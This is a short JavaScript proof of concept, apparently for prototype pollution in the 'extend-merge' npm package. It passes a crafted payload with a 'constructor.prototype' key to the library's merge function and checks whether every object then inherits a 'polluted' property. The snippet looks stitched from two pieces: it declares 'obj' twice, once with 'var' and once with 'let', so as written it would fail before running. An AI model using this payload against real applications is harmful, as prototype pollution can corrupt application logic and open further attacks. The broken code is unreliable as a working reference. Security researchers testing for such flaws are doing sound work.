var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const extend_merge = require('extend-merge');
const payload = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
let obj = {};
console.log({}.polluted);
extend_merge.merge(obj, payload);
console.log({}.polluted);